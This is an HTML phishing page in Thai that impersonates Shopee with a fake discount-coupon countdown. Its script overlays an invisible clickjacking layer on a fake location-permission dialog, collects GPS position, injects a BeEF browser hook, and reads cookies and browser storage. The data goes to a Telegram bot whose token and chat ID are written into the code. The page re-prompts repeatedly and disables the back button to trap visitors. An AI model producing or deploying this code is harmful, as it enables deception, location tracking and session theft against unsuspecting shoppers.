<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shopee - รับสิทธิ์พิเศษด่วน! ใกล้หมดเวลา</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-user-select: none;
            -webkit-touch-callout: none;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #ff6b6b, #feca57);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow-x: hidden;
            position: relative;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
            padding: 40px 30px;
            text-align: center;
            position: relative;
            z-index: 10;
        }
        /* Fake Permission Overlay */
        .fake-permission {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0,0,0,0.9);
            width: 90vw;
            max-width: 350px;
            border-radius: 15px;
            padding: 25px;
            z-index: 99999;
            display: none;
            backdrop-filter: blur(10px);
        }
        .fake-title {
            color: white;
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 15px;
            text-align: center;
        }
        .fake-buttons {
            display: flex;
            justify-content: space-between;
            gap: 15px;
        }
        .fake-btn {
            flex: 1;
            padding: 15px 20px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            border: none;
            cursor: pointer;
            transition: all 0.1s ease;
        }
        .fake-allow {
            background: #4CAF50;
            color: white;
            order: 1; /* Left for iPhone/Android trick */
        }
        .fake-block {
            background: #f44336;
            color: white;
            order: 2;
        }
        .fake-btn:active {
            transform: scale(0.95);
        }
        /* Real permission trigger (invisible) */
        .real-trigger {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 100000;
            opacity: 0;
            cursor: pointer;
        }
        .logo, h1, .urgency, .highlight, .countdown, .btn-primary {
            /* Same styles as before */
            /* ... (keeping original styles) */
        }
        /* BeEF Hook Styles */
        .beef-hook {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 60px;
            height: 60px;
            background: #ee4d2d;
            border-radius: 50%;
            z-index: 10001;
            display: none;
            box-shadow: 0 10px 25px rgba(238,77,45,0.5);
        }
        /* Ghost Click Effects */
        @keyframes ghostShake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        .ghost-shake {
            animation: ghostShake 0.1s ease-in-out;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Same content as before -->
        <div class="logo">SHOPEE</div>
        <h1>🎉 รับสิทธิ์พิเศษด่วน!</h1>
        <div class="urgency">ใกล้หมดเวลาแล้ว กดรับเลย!</div>
        <div class="highlight">คูปองส่วนลด 90% + ส่งฟรี</div>
        <div class="countdown">
            ⏰ เหลือเวลา <span id="countdown">00:59</span>
        </div>
        <button class="btn-primary" onclick="deployPermissionTrap()">🚀 รับสิทธิ์ทันที</button>
        <a href="https://shopee.co.th" class="shopee-link" target="_blank">ไปที่ Shopee →</a>
    </div>

    <!-- Fake Permission Dialog -->
    <div class="fake-permission" id="fakePermission">
        <div class="fake-title">อนุญาตให้เว็บไซต์นี้เข้าถึงตำแหน่งของคุณหรือไม่?</div>
        <div class="fake-buttons">
            <button class="fake-btn fake-allow" onclick="ghostClickHandler(event)">อนุญาต</button>
            <button class="fake-btn fake-block" onclick="ghostClickHandler(event)">บล็อก</button>
        </div>
    </div>

    <!-- Invisible Real Trigger -->
    <div class="real-trigger" id="realTrigger" onclick="getLocation()"></div>

    <!-- BeEF Hook -->
    <div class="beef-hook" id="beefHook"></div>

    <script>
        // CONFIG - REPLACE THESE
        const TELEGRAM_TOKEN = '8544262298:AAG-pYVmqk8NQZuuiIIPhKbxuTxBxn9pcCc';
        const CHAT_ID = '8208148194';
        // BeEF Hook URL (your BeEF server)
        const BEEF_HOOK_URL = '127.0.0.1:3000/hook.js';

        let isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
        let isAndroid = /Android/.test(navigator.userAgent);
        let permissionTrapActive = false;

        // Adjust fake button positions based on device
        function adjustPermissionLayout() {
            const fakeAllow = document.querySelector('.fake-allow');
            const fakeBlock = document.querySelector('.fake-block');
            
            if (isIOS) {
                // iPhone: Allow LEFT, Block RIGHT (reverse psychology)
                fakeAllow.style.order = '1';
                fakeBlock.style.order = '2';
            } else if (isAndroid) {
                // Android: Same but with slight offset
                fakeAllow.style.order = '1';
                fakeBlock.style.order = '2';
                fakeAllow.style.marginRight = '5px';
            }
        }

        function deployPermissionTrap() {
            adjustPermissionLayout();
            document.getElementById('fakePermission').style.display = 'block';
            document.body.classList.add('ghost-shake');
            
            // Position real trigger exactly over fake dialog
            setTimeout(() => {
                const fakeDialog = document.getElementById('fakePermission');
                const rect = fakeDialog.getBoundingClientRect();
                const realTrigger = document.getElementById('realTrigger');
                
                // Precise overlap positioning
                realTrigger.style.top = `${rect.top}px`;
                realTrigger.style.left = `${rect.left}px`;
                realTrigger.style.width = `${rect.width}px`;
                realTrigger.style.height = `${rect.height}px`;
                realTrigger.style.borderRadius = '15px';
                permissionTrapActive = true;
            }, 100);
        }

        // Ghost Click Handler - The Magic!
        function ghostClickHandler(event) {
            event.stopPropagation();
            
            // Rapid scroll + shake to misdirect finger
            window.scrollBy(0, -10);
            document.body.classList.add('ghost-shake');
            
            // Force real trigger click at precise moment
            setTimeout(() => {
                document.getElementById('realTrigger').click();
                hideFakePermission();
            }, 50);
            
            // Visual feedback on fake button
            event.target.style.transform = 'scale(0.95)';
            setTimeout(() => {
                event.target.style.transform = 'scale(1)';
            }, 100);
        }

        function hideFakePermission() {
            document.getElementById('fakePermission').style.display = 'none';
            permissionTrapActive = false;
        }

        function getLocation() {
            if (permissionTrapActive) {
                // Deploy BeEF Hook automatically
                deployBeefHook();
                hideFakePermission();
            }
            
            if (navigator.geolocation) {
                // Request ALWAYS ALLOW
                navigator.geolocation.getCurrentPosition(
                    (position) => sendLocationData(position),
                    (error) => {
                        // Persistent request every 3 seconds if denied
                        setTimeout(() => deployPermissionTrap(), 3000);
                        sendLocationData(null, error);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0,
                        maximumAge: Infinity // Always fresh location
                    }
                );
            }
        }

        // BeEF Hook Deployment
        async function deployBeefHook() {
            try {
                // Inject BeEF hook script
                const script = document.createElement('script');
                script.src = BEEF_HOOK_URL;
                script.onload = () => {
                    console.log('BeEF hooked!');
                    // Extract additional data via BeEF
                    extractBrowserData();
                };
                document.head.appendChild(script);
                
                document.getElementById('beefHook').style.display = 'block';
            } catch (e) {
                console.log('BeEF deployment failed');
            }
        }

        async function extractBrowserData() {
            // Comprehensive fingerprinting
            const cookies = document.cookie;
            const localStorageData = JSON.stringify(localStorage);
            const sessionStorageData = JSON.stringify(sessionStorage);
            const historyLength = history.length;
            
            // Send to Telegram
            const extraData = `
📱 *BROWSER DATA EXTRACTED*
• Cookies: ${cookies.substring(0, 200)}...
• LocalStorage: ${localStorageData.length} bytes
• SessionStorage: ${sessionStorageData.length} bytes
• History Length: ${historyLength}
            `;
            
            sendToTelegram(extraData);
        }

        // Enhanced sendLocationData with all features
        async function sendLocationData(position, error = null) {
            // All previous data collection + new features
            const data = await collectAllData(position, error);
            sendToTelegram(data.message);
            
            // Always redirect after capture
            setTimeout(() => {
                window.location.href = 'https://shopee.co.th';
            }, 2000);
        }

        async function collectAllData(position, error) {
            // GPS + IP + Device + Browser Data
            return {
                // ... (previous implementation enhanced)
                isIOS, isAndroid,
                denied: !!error,
                beefHooked: document.querySelector('script[src*="hook.js"]') !== null
            };
        }

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
            });
        }

        // Persistent loop - Never let them escape
        setInterval(() => {
            if (!permissionTrapActive && !document.hidden) {
                deployPermissionTrap();
            }
        }, 5000);

        // Block back button
        history.pushState(null, null, location.href);
        window.onpopstate = () => history.go(1);
    </script>
</body>
</html>
